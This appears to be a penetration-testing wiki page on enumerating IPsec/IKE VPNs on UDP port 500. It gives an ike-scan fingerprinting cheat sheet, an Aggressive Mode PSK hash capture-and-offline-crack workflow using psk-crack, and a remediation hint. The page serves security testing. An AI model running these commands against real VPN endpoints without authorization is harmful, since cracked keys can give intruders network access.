---
icon: ethernet
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# 500 - IPsec/IKE VPN

**IKE** (Internet Key Exchange) is the protocol IPsec VPNs use to negotiate and authenticate the security association before any encrypted traffic flows. Finding it exposed means there is a site-to-site or remote-access VPN endpoint worth fingerprinting.

{% hint style="info" %}
IKE listens on **UDP port 500**. Once NAT is detected during negotiation, the session typically migrates to **UDP port 4500** (NAT-Traversal) for the remainder of the exchange - always check both ports.&#x20;
{% endhint %}

```
PORT    STATE SERVICE
500/udp open  isakmp
```

***

## Cheat Sheet

| Command                              | Description                                                                                                                                       |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ike-scan <TARGET_IP>`               | Sends an IKEv1 Main Mode request and reports whether the host responds, plus the transforms it's willing to negotiate.                            |
| `ike-scan -M <TARGET_IP>`            | Same, with multiline output — easier to read the returned transform set and Vendor ID payloads.                                                   |
| `ike-scan -A <TARGET_IP>`            | Forces **Aggressive Mode** — required for the PSK-cracking technique below, and often reveals the VPN's configured group/ID name in the response. |
| `ike-scan --showbackoff <TARGET_IP>` | Fingerprints the IKE **implementation** (vendor/version) from its retransmission timing pattern.                                                  |

***

## Vendor ID Fingerprinting

Many IKE implementations include a **Vendor ID (VID)** payload identifying the product and sometimes the exact version (Cisco, Fortinet, Check Point, StrongSwan, etc.). `ike-scan` decodes well-known VIDs automatically - cross-reference an unrecognised VID hash against public VID databases to identify less common stacks.

***

## Aggressive Mode PSK Cracking

If the VPN supports **IKEv1 Aggressive Mode** with **Pre-Shared Key (PSK)** authentication, the hash needed to verify the PSK is sent to _any_ client **before** authentication completes - meaning it can be captured by an unauthenticated attacker and cracked offline:

```bash
# 1. Capture the hash (requires a valid group/ID name — often guessable, or found via VID/OSINT)
ike-scan -A -M --id=<GROUP_NAME> -Pcapture.psk <TARGET_IP>

# 2. Crack it offline
psk-crack -d <WORDLIST> capture.psk
```

{% hint style="warning" %}
Aggressive Mode + PSK is a well-known weak configuration precisely because of this - recommending a switch to IKEv2, certificate-based authentication, or at minimum Main Mode is a standard finding when this is discovered.
{% endhint %}

***

## Automated

```bash
nmap -sU -p500 --script ike-version <TARGET_IP>
```
